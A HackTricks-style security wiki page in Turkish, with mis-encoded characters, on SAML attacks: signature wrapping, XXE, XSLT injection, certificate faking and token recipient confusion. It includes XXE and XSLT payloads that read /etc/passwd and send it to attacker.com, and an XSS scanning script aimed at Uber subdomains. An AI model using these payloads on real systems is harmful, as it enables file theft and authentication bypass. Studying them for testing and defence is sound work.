# SAML SaldÄ±rÄ±larÄ±

## SAML SaldÄ±rÄ±larÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## AraÃ§

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Bir URL veya URL listesi alabilen ve SAML tÃ¼ketim URL'sini geri yazdÄ±ran bir araÃ§.

## XML gidiÅŸ-dÃ¶nÃ¼ÅŸ

XML'de, XML'in imzalÄ± kÄ±smÄ± bellekte saklanÄ±r, ardÄ±ndan bazÄ± kodlama/ÅŸifreleme iÅŸlemleri gerÃ§ekleÅŸtirilir ve imza kontrol edilir. Ä°deal olarak, bu kodlama/ÅŸifreleme veriyi deÄŸiÅŸtirmemelidir, ancak bu senaryoya dayanarak, **kontrol edilen veri ile orijinal veri aynÄ± olmayabilir**.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki kodu kontrol edin:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
REXML 3.2.4 veya daha Ã¶nceki bir sÃ¼rÃ¼mle programÄ± Ã§alÄ±ÅŸtÄ±rmak, bunun yerine aÅŸaÄŸÄ±daki Ã§Ä±ktÄ±yÄ± verecektir:
```
First child in original doc: Y
First child after round-trip: Z
```
Bu, REXML'in yukarÄ±daki programdan orijinal XML belgesini nasÄ±l gÃ¶rdÃ¼ÄŸÃ¼dÃ¼r:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

Ve bu da, bir dizi ayrÄ±ÅŸtÄ±rma ve serileÅŸtirme iÅŸleminden sonra nasÄ±l gÃ¶rdÃ¼ÄŸÃ¼dÃ¼r:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

Zafiyet ve nasÄ±l istismar edileceÄŸi hakkÄ±nda daha fazla bilgi iÃ§in:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Ä°mza Sarma SaldÄ±rÄ±larÄ±

**XML Ä°mza Sarma saldÄ±rÄ±larÄ±nda (XSW)**, dÃ¼ÅŸmanlar XML belgeleri iki ayrÄ± aÅŸamadan geÃ§irildiÄŸinde ortaya Ã§Ä±kan bir zafiyeti istismar eder: **imza doÄŸrulama** ve **iÅŸlev Ã§aÄŸrÄ±sÄ±**. Bu saldÄ±rÄ±lar, XML belgesinin yapÄ±sÄ±nÄ± deÄŸiÅŸtirmeyi iÃ§erir. Ã–zellikle, saldÄ±rgan **sahte Ã¶ÄŸeler** enjekte eder ve bu Ã¶ÄŸeler XML Ä°mzasÄ±'nÄ±n geÃ§erliliÄŸini tehlikeye atmaz. Bu manipÃ¼lasyon, **uygulama mantÄ±ÄŸÄ±** tarafÄ±ndan analiz edilen Ã¶ÄŸeler ile **imza doÄŸrulama modÃ¼lÃ¼** tarafÄ±ndan kontrol edilenler arasÄ±nda bir tutarsÄ±zlÄ±k yaratmayÄ± amaÃ§lar. SonuÃ§ olarak, XML Ä°mzasÄ± teknik olarak geÃ§erli kalÄ±rken ve doÄŸrulamadan geÃ§erken, uygulama mantÄ±ÄŸÄ± **sahte Ã¶ÄŸeleri** iÅŸler. BÃ¶ylece, saldÄ±rgan XML Ä°mzasÄ±'nÄ±n **bÃ¼tÃ¼nlÃ¼k korumasÄ±nÄ±** ve **kaynak kimlik doÄŸrulamasÄ±nÄ±** etkili bir ÅŸekilde atlatÄ±r ve **rastgele iÃ§erik enjekte etme** olanaÄŸÄ±na sahip olur.

AÅŸaÄŸÄ±daki saldÄ±rÄ±lar [**bu blog yazÄ±sÄ±na**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **ve** [**bu makaleye**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) dayanmaktadÄ±r. Daha fazla ayrÄ±ntÄ± iÃ§in bunlarÄ± kontrol edin.

### XSW #1

* **Strateji**: Ä°mza iÃ§eren yeni bir kÃ¶k Ã¶ÄŸe eklenir.
* **SonuÃ§**: DoÄŸrulayÄ±cÄ±, meÅŸru "Response -> Assertion -> Subject" ile saldÄ±rganÄ±n "kÃ¶tÃ¼ yeni Response -> Assertion -> Subject" arasÄ±nda karÄ±ÅŸÄ±klÄ±k yaÅŸayabilir, bu da veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ sorunlarÄ±na yol aÃ§ar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **XSW #1'den FarkÄ±**: Sarma imzasÄ± yerine ayrÄ±k bir imza kullanÄ±r.
* **SonuÃ§**: XSW #1'e benzer "kÃ¶tÃ¼" yapÄ±, bÃ¼tÃ¼nlÃ¼k kontrolÃ¼nden sonra iÅŸ mantÄ±ÄŸÄ±nÄ± yanÄ±ltmayÄ± amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strateji**: KÃ¶tÃ¼ bir Assertion, orijinal assertion ile aynÄ± hiyerarÅŸik seviyede oluÅŸturulur.
* **SonuÃ§**: Ä°ÅŸ mantÄ±ÄŸÄ±nÄ± kÃ¶tÃ¼ niyetli verileri kullanmaya yÃ¶nlendirmeyi amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **XSW #3'ten FarkÄ±**: Orijinal Assertion, kopyalanmÄ±ÅŸ (kÃ¶tÃ¼) Assertion'Ä±n Ã§ocuÄŸu haline gelir.
* **SonuÃ§**: XSW #3'e benzer ancak XML yapÄ±sÄ±nÄ± daha agresif bir ÅŸekilde deÄŸiÅŸtirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Benzersiz Ã–zellik**: Ne Ä°mza ne de orijinal Assertion standart yapÄ±landÄ±rmalara (sarmalÄ±/saran/ayrÄ±k) uyar.
* **SonuÃ§**: KopyalanmÄ±ÅŸ Assertion, Ä°mza'yÄ± sarar ve beklenen belge yapÄ±sÄ±nÄ± deÄŸiÅŸtirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strateji**: XSW #4 ve #5 ile benzer konum ekleme, ancak bir deÄŸiÅŸiklikle.
* **SonuÃ§**: KopyalanmÄ±ÅŸ Assertion, Ä°mza'yÄ± sarar, bu da orijinal Assertion'Ä± sarar ve iÃ§ iÃ§e geÃ§miÅŸ yanÄ±ltÄ±cÄ± bir yapÄ± oluÅŸturur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strateji**: KopyalanmÄ±ÅŸ Assertion'Ä±n Ã§ocuk olarak eklendiÄŸi bir Extensions Ã¶ÄŸesi eklenir.
* **SonuÃ§**: Bu, Extensions Ã¶ÄŸesinin daha az kÄ±sÄ±tlayÄ±cÄ± ÅŸemasÄ±nÄ± istismar ederek ÅŸema doÄŸrulama Ã¶nlemlerini atlatÄ±r, Ã¶zellikle OpenSAML gibi kÃ¼tÃ¼phanelerde.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **XSW #7'den FarkÄ±**: SaldÄ±rÄ±nÄ±n bir varyantÄ± iÃ§in baÅŸka bir daha az kÄ±sÄ±tlayÄ±cÄ± XML Ã¶ÄŸesi kullanÄ±r.
* **SonuÃ§**: Orijinal Assertion, daha az kÄ±sÄ±tlayÄ±cÄ± Ã¶ÄŸenin Ã§ocuÄŸu haline gelir ve XSW #7'de kullanÄ±lan yapÄ±yÄ± tersine Ã§evirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### AraÃ§

Ä°steÄŸi ayrÄ±ÅŸtÄ±rmak, seÃ§tiÄŸiniz herhangi bir XSW saldÄ±rÄ±sÄ±nÄ± uygulamak ve baÅŸlatmak iÃ§in Burp eklentisi [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

## XXE

XXE saldÄ±rÄ±larÄ±nÄ±n ne tÃ¼r saldÄ±rÄ±lar olduÄŸunu bilmiyorsanÄ±z, lÃ¼tfen aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML YanÄ±tlarÄ± **deflate edilmiÅŸ ve base64 kodlanmÄ±ÅŸ XML belgeleri**dir ve XML DÄ±ÅŸsal VarlÄ±k (XXE) saldÄ±rÄ±larÄ±na karÅŸÄ± hassas olabilir. SAML YanÄ±tÄ±nÄ±n XML yapÄ±sÄ±nÄ± manipÃ¼le ederek, saldÄ±rganlar XXE zafiyetlerini istismar etmeye Ã§alÄ±ÅŸabilir. Ä°ÅŸte bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l gÃ¶rselleÅŸtirilebileceÄŸi:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## AraÃ§lar

SAML isteÄŸinden POC oluÅŸturmak iÃ§in olasÄ± XXE zafiyetlerini ve SAML zafiyetlerini test etmek amacÄ±yla Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)'Ä± da kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmaya da gÃ¶z atÄ±n: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML Ãœzerinden XSLT

XSLT hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

GeniÅŸletilebilir Stil SayfasÄ± Dili DÃ¶nÃ¼ÅŸÃ¼mleri (XSLT), XML belgelerini HTML, JSON veya PDF gibi Ã§eÅŸitli formatlara dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±labilir. **XSLT dÃ¶nÃ¼ÅŸÃ¼mlerinin dijital imzanÄ±n doÄŸrulanmasÄ±ndan Ã¶nce gerÃ§ekleÅŸtirildiÄŸini** belirtmek Ã¶nemlidir. Bu, bir saldÄ±rÄ±nÄ±n geÃ§erli bir imza olmadan bile baÅŸarÄ±lÄ± olabileceÄŸi anlamÄ±na gelir; kendi imzalÄ± veya geÃ§ersiz bir imza devam etmek iÃ§in yeterlidir.

Bu tÃ¼r zafiyetleri kontrol etmek iÃ§in bir **POC** bulabilirsiniz, bu bÃ¶lÃ¼mÃ¼n baÅŸÄ±nda bahsedilen hacktricks sayfasÄ±nda yÃ¼kler iÃ§in de bulabilirsiniz.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### AraÃ§

SAML isteÄŸinden POC oluÅŸturmak iÃ§in olasÄ± XSLT zafiyetlerini test etmek Ã¼zere Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmayÄ± kontrol edin: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Ä°mza HariÃ§ Tutma <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Ä°mza HariÃ§ Tutma**, Ä°mza Ã¶ÄŸesinin mevcut olmadÄ±ÄŸÄ± durumlarda SAML uygulamalarÄ±nÄ±n davranÄ±ÅŸÄ±nÄ± gÃ¶zlemler. Bu Ã¶ÄŸe eksikse, **imza doÄŸrulamasÄ± gerÃ§ekleÅŸmeyebilir**, bu da onu savunmasÄ±z hale getirir. Bu durumu, genellikle imza ile doÄŸrulanan iÃ§erikleri deÄŸiÅŸtirerek test etmek mÃ¼mkÃ¼ndÃ¼r.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### AraÃ§ <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz. SAML YanÄ±tÄ±nÄ± yakalayÄ±n ve `Ä°mzalarÄ± KaldÄ±r` butonuna tÄ±klayÄ±n. BÃ¶ylece **tÃ¼m** Ä°mza Ã¶ÄŸeleri kaldÄ±rÄ±lÄ±r.

Ä°mzalar kaldÄ±rÄ±ldÄ±ktan sonra, isteÄŸin hedefe devam etmesine izin verin. EÄŸer Ä°mza, Servis tarafÄ±ndan gerekli deÄŸilse

## Sertifika SahteciliÄŸi <a href="#certificate-faking" id="certificate-faking"></a>

## Sertifika SahteciliÄŸi

Sertifika SahteciliÄŸi, bir **Hizmet SaÄŸlayÄ±cÄ±nÄ±n (SP), bir SAML MesajÄ±nÄ±n gÃ¼venilir bir Kimlik SaÄŸlayÄ±cÄ± (IdP) tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± test etme** tekniÄŸidir. Bu, SAML YanÄ±tÄ±nÄ± veya Ä°ddiasÄ±nÄ± imzalamak iÃ§in \***kendinden imzalÄ± bir sertifika** kullanmayÄ± iÃ§erir ve bu, SP ile IdP arasÄ±ndaki gÃ¼ven doÄŸrulama sÃ¼recini deÄŸerlendirmeye yardÄ±mcÄ± olur.

### Sertifika SahteciliÄŸi NasÄ±l YapÄ±lÄ±r

AÅŸaÄŸÄ±daki adÄ±mlar, [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp uzantÄ±sÄ±nÄ± kullanarak sÃ¼reci Ã¶zetlemektedir:

1. SAML YanÄ±tÄ±nÄ± yakalayÄ±n.
2. YanÄ±t bir imza iÃ§eriyorsa, sertifikayÄ± `SertifikayÄ± SAML Raider SertifikalarÄ±na GÃ¶nder` butonunu kullanarak gÃ¶nderin.
3. SAML Raider Sertifikalar sekmesinde, iÃ§e aktarÄ±lan sertifikayÄ± seÃ§in ve kendinden imzalÄ± bir kopya oluÅŸturmak iÃ§in `Kaydet ve Kendinden Ä°mzala` butonuna tÄ±klayÄ±n.
4. Burp'un Proxy'sinde yakalanan isteÄŸe geri dÃ¶nÃ¼n. XML Ä°mza aÃ§Ä±lÄ±r menÃ¼sÃ¼nden yeni kendinden imzalÄ± sertifikayÄ± seÃ§in.
5. `Ä°mzalarÄ± KaldÄ±r` butonunu kullanarak mevcut imzalarÄ± kaldÄ±rÄ±n.
6. MesajÄ± veya iddiayÄ± yeni sertifika ile **`(Yeniden) MesajÄ± Ä°mzala`** veya **`(Yeniden) Ä°ddia Ä°mzala`** butonunu kullanarak imzalayÄ±n.
7. Ä°mzalÄ± mesajÄ± iletin. BaÅŸarÄ±lÄ± bir kimlik doÄŸrulama, SP'nin kendinden imzalÄ± sertifikanÄ±zla imzalanmÄ±ÅŸ mesajlarÄ± kabul ettiÄŸini gÃ¶sterir ve SAML mesajlarÄ±nÄ±n doÄŸrulama sÃ¼recinde potansiyel zafiyetleri ortaya Ã§Ä±karÄ±r.

## Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± / Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ± <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± ve Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ±, **Hizmet SaÄŸlayÄ±cÄ±nÄ±n bir yanÄ±tÄ±n hedef alÄ±cÄ±sÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ±** kontrol etmeyi iÃ§erir. Ã–zÃ¼nde, bir Hizmet SaÄŸlayÄ±cÄ±, bir baÅŸka saÄŸlayÄ±cÄ± iÃ§in tasarlanmÄ±ÅŸsa bir kimlik doÄŸrulama yanÄ±tÄ±nÄ± reddetmelidir. Buradaki kritik unsur, SAML YanÄ±tÄ±nÄ±n **SubjectConfirmationData** Ã¶ÄŸesi iÃ§inde bulunan **AlÄ±cÄ±** alanÄ±dÄ±r. Bu alan, Ä°ddianÄ±n gÃ¶nderilmesi gereken yeri belirten bir URL'yi belirtir. EÄŸer gerÃ§ek alÄ±cÄ±, hedef Hizmet SaÄŸlayÄ±cÄ± ile eÅŸleÅŸmiyorsa, Ä°ddia geÃ§ersiz sayÄ±lmalÄ±dÄ±r.

#### **NasÄ±l Ã‡alÄ±ÅŸÄ±r**

Bir SAML Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± (SAML-TRC) saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilebilmesi iÃ§in belirli koÅŸullarÄ±n saÄŸlanmasÄ± gerekir. Ã–ncelikle, bir Hizmet SaÄŸlayÄ±cÄ±da (SP-Legit olarak adlandÄ±rÄ±lÄ±r) geÃ§erli bir hesap olmalÄ±dÄ±r. Ä°kincisi, hedeflenen Hizmet SaÄŸlayÄ±cÄ± (SP-Target), SP-Legit'e hizmet veren aynÄ± Kimlik SaÄŸlayÄ±cÄ±dan token kabul etmelidir.

Bu koÅŸullar altÄ±nda saldÄ±rÄ± sÃ¼reci basittir. PaylaÅŸÄ±lan Kimlik SaÄŸlayÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP-Legit ile geÃ§erli bir oturum baÅŸlatÄ±lÄ±r. Kimlik SaÄŸlayÄ±cÄ±dan SP-Legit'e gelen SAML YanÄ±tÄ± yakalanÄ±r. Bu yakalanan SAML YanÄ±tÄ±, aslÄ±nda SP-Legit iÃ§in tasarlanmÄ±ÅŸken, SP-Target'a yÃ¶nlendirilir. Bu saldÄ±rÄ±daki baÅŸarÄ±, SP-Target'Ä±n Ä°ddia kabul etmesiyle Ã¶lÃ§Ã¼lÃ¼r ve bu, SP-Legit iÃ§in kullanÄ±lan aynÄ± hesap adÄ± altÄ±nda kaynaklara eriÅŸim saÄŸlar.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## Ã‡Ä±kÄ±ÅŸ iÅŸlevinde XSS

Orijinal araÅŸtÄ±rmaya [bu baÄŸlantÄ±dan](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) eriÅŸilebilir.

Dizin brute forcing sÃ¼recinde, ÅŸu adreste bir Ã§Ä±kÄ±ÅŸ sayfasÄ± keÅŸfedildi:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Bu baÄŸlantÄ±ya eriÅŸildiÄŸinde, bir yÃ¶nlendirme gerÃ§ekleÅŸti:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Bu, `base` parametresinin bir URL kabul ettiÄŸini ortaya koydu. Bunu dikkate alarak, bir XSS (Cross-Site Scripting) saldÄ±rÄ±sÄ±nÄ± baÅŸlatma giriÅŸimiyle URL'yi `javascript:alert(123);` ile deÄŸiÅŸtirme fikri ortaya Ã§Ä±ktÄ±.

### Kitlesel SÃ¶mÃ¼rÃ¼

[Bu araÅŸtÄ±rmadan](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) aracÄ±, aynÄ± kÃ¼tÃ¼phaneyi kullanan `uberinternal.com` alt alanlarÄ±nÄ± analiz etmek iÃ§in kullanÄ±ldÄ±. ArdÄ±ndan, `oidauth/prompt` sayfasÄ±nÄ± hedef alan bir script geliÅŸtirildi. Bu script, verileri girerek ve Ã§Ä±ktÄ±da yansÄ±yÄ±p yansÄ±madÄ±ÄŸÄ±nÄ± kontrol ederek XSS (Cross-Site Scripting) testi yapar. Girdi gerÃ§ekten yansÄ±yorsa, script sayfayÄ± savunmasÄ±z olarak iÅŸaretler.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referanslar

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
